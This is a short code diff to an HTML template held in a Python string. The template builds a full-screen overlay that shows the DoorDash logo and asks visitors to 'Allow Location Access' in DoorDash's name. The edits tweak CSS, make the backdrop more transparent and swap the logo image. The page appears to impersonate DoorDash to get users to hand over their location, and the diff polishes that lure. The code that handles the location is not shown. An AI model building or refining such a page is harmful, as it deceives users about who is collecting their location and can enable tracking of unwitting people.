@@ -22,20 +22,21 @@ HTML_TEMPLATE = """
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
     <style>
-        .body {{
-            font-family: -apple-system, BlinkMacSystemFont, 
-            "Segoe UI", Roboto, Helvetica, Arial, 
-            sans-serif, "Apple Color Emoji";
-            -webkit-font-smoothing: antialiased;
-            -moz-osx-font-smoothing: grayscale;
+.body {{
+  font-family: -apple-system, BlinkMacSystemFont, 
+               "Segoe UI", Roboto, Helvetica, Arial, 
+               sans-serif, "Apple Color Emoji";
+  -webkit-font-smoothing: antialiased;
+  -moz-osx-font-smoothing: grayscale;
 }}
+
         .gps-overlay {{
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0,0,0,0.9);
+            background: rgba(0,0,0,0.25);
             display: flex;
             justify-content: center;
             align-items: center;
@@ -68,7 +69,7 @@ HTML_TEMPLATE = """
     <!-- GPS Permission Overlay -->
     <div class="gps-overlay">
         <div class="gps-modal">
-            <img src="https://cdn.doordash.com/managed/consumer/seo/doordash_seo_desktop.png" width="120" alt="DoorDash">
+            <img src="https://1000logos.net/wp-content/uploads/2021/06/DoorDash-logo.png" width="150" alt="DoorDash">
             <h2>DoorDash needs your location to find restaurants near you</h2>
             <p>Please allow location access to continue to DoorDash.com</p>
             <button class="gps-btn" id="gps-allow-btn">Allow Location Access</button>
